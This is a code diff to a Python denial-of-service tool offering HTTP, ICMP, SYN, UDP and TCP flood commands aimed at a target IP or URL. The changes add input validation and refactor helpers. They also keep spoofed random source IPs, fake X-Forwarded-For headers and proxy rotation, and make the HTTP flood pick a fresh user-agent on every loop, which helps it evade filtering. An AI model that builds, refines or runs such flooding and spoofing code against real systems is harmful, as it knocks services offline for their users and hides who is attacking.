@@ -11,6 +11,7 @@ from scapy.all import *
 import platform
 import subprocess
 import ctypes
+from urllib.parse import urlparse
 
 max_packet_size = 1400
 status_helper = []
@@ -34,16 +35,136 @@ def disclaimer():
 
 
 def packet_validation(args):
-    if args.weight > max_packet_size:
-        size_answer = input("WARNING packet can get fragmented still continue? (y/n)")
-        if size_answer.lower() in ["n", "no"]:
-            print("exiting...")
-            sys.exit()
-        elif size_answer.lower() in ["y", "yes"]:
-            pass
+    if hasattr(args, "weight"):
+        if args.weight > max_packet_size:
+            size_answer = input("WARNING packet can get fragmented still continue? (y/n)")
+            if size_answer.lower() in ["n", "no"]:
+                print("exiting...")
+                sys.exit()
+            elif size_answer.lower() in ["y", "yes"]:
+                pass
     
+        else:
+            pass
     else:
         pass        
+
+def ttl_validation(args):
+    if hasattr(args, "ttl"):
+        if args.ttl <= 0 or args.ttl > 255:
+            print("ttl must be between 1 and 255")
+            sys.exit()
+
+def timeout_validation(args):
+    if hasattr(args, "timeout"):
+        if args.timeout <= 0:
+            print("timeout must be greater than 0")
+            sys.exit()
+        else:
+            pass
+    
+
+def ip_validation(args):
+    if args.command  in ["icmpflood", "synflood", "udpflood"]:
+        if args.src != "random":
+            try:
+                ipaddress.IPv4Address(args.src) 
+            except ipaddress.AddressValueError:
+                print("invalid ip address. please try again.")
+                sys.exit()
+        try:
+            ipaddress.IPv4Address(args.target_ip) 
+        except ipaddress.AddressValueError:
+            print("invalid ip address. please try again.")
+            sys.exit()
+
+    elif args.command in ["tcpflood"]:
+        try:
+            ipaddress.IPv4Address(args.target_ip) 
+        except ipaddress.AddressValueError:
+            print("invalid ip address. please try again.")
+            sys.exit()
+    else:
+        pass
+
+
+def port_validation(args):
+    if hasattr(args, "port"):
+        if args.port > 65535 or args.port <= 0:
+            print("port must be less than 65535 and greater than 0")
+            sys.exit()
+        else:
+            pass    
+    else:
+        pass
+
+def quantity_validation(args):
+    if args.quantity <= 0:
+        print("quantity must be greater than 0")
+        sys.exit()
+    else:
+        pass    
+
+
+def delay_validation(args):
+    if args.delay < 0:
+        print("delay must be 0 or greater")
+        sys.exit()
+    else:
+        pass
+
+def duration_validation(args):
+    if args.duration <= 0:
+        print("duration must be greater than 0")
+        sys.exit()
+    else:
+        pass    
+
+def url_validation(args):
+    if hasattr(args, "url"):
+        result = urlparse(args.url)
+        if not result.scheme or not result.netloc:
+            print("enter valid url")
+            sys.exit()
+        if result.scheme not in ["http", "https"]:
+            print("enter url with http or https")     
+            sys.exit()
+    else:
+        pass
+
+
+def proxy_validation(args):
+    if hasattr(args, "proxies") and args.proxies:
+        for proxy in args.proxies:
+            result = urlparse(proxy)
+            if not result.scheme or not result.netloc:
+                print(f"invalid proxy format {proxy}")
+                sys.exit()
+            if result.scheme not in ["socks4", "socks5", "http", "https"]:
+                print("proxy must use one of these socks4/socks5/http/https")
+                sys.exit()
+            if result.port and (result.port <= 0 or result.port > 65535):
+                print("invalid port")
+                sys.exit()
+                                     
+def universal_validation(args):
+    ip_validation(args)
+    ttl_validation(args)
+    timeout_validation(args)
+    packet_validation(args)
+    port_validation(args)
+    quantity_validation(args)
+    duration_validation(args)
+    delay_validation(args)
+    url_validation(args)
+    proxy_validation(args)
+
+def proxy_helper(args):
+    proxies = args.proxies
+    proxy = random.choice(proxies) if proxies else None
+    x_forwarded_for = randomip() if not proxy else None
+    return proxy, x_forwarded_for
+
 
 def administrator_check():
     system = platform.system()
@@ -81,35 +202,7 @@ def randomip():
             continue 
         return ip
 
-def ip_validation_src(args):
-    try:
-        ipaddress.IPv4Address(args.src) 
-    except ipaddress.AddressValueError:
-        print("invalid ip address. please try again.")
-        sys.exit()
 
-def ip_validation_target(args):
-    try:
-        ipaddress.IPv4Address(args.target_ip) 
-    except ipaddress.AddressValueError:
-        print("invalid ip address. please try again.")
-        sys.exit()
-
-def proxy_helper(args):
-    proxies = args.proxies
-    proxy = random.choice(proxies) if proxies else None
-    if proxy and not proxy.startswith(("http://", "https://", "socks5://", "socks4://")):
-        print(f"WARNING proxy format may be invalid: {proxy}")
-
-    x_forwarded_for = randomip() if not proxy else None
-    return proxy, x_forwarded_for
-
-def source_helper(args):
-    if args.src == "random":
-        source_ip = randomip()
-    else:
-        source_ip = args.src
-    return source_ip    
 
 
 async def statuscode(session, args):
@@ -138,7 +231,7 @@ async def statuscode(session, args):
                 print(f"unexpected status code {status}")
             status_helper.append(1)
         else:
-            print(f"status code {status}")
+            print(f"sent {args.quantity} status code {status}")
 
 
 def Keyboard_interrupt_helper():
@@ -148,6 +241,14 @@ def Keyboard_interrupt_helper():
 def exception_helper():
     print("error has occurred")
     sys.exit()
+
+def source_helper(args):
+    if args.src == "random":
+        source_ip = randomip()
+    else:
+        source_ip = args.src
+    return source_ip    
+
 
 def user_agent():
     browsers = ["firefox", "chrome"]
@@ -183,8 +284,8 @@ async def http_get_flood(args):
         async with aiohttp.ClientSession(timeout=timeout_info) as session:
             await statuscode(session, args)
             start_time = time.time()
-            useragent= user_agent()
             while True:
+                useragent= user_agent()
                 if time.time() - start_time >= args.duration:
                     break
                 tasks = []    
@@ -368,21 +469,14 @@ tcp_parser.add_argument("--timeout", type=int, default=2, help="tcp connection t
 
 if __name__ == "__main__":
     args = parser.parse_args()
+    universal_validation(args)
     if args.command == "httpflood":
         asyncio.run(http_get_flood(args))
     elif args.command == "icmpflood":
-        if args.src != "random":
-            ip_validation_src(args)
         asyncio.run(icmpflood(args))
     elif args.command == "synflood":
-        if args.src != "random":
-            ip_validation_src(args)
         asyncio.run(synflood(args)) 
     elif args.command == "udpflood":
-        if args.src != "random":
-            ip_validation_src(args)
         asyncio.run(udp_flood(args))
     elif args.command == "tcpflood":
-        ip_validation_target(args)
         asyncio.run(tcp_flood(args))
-
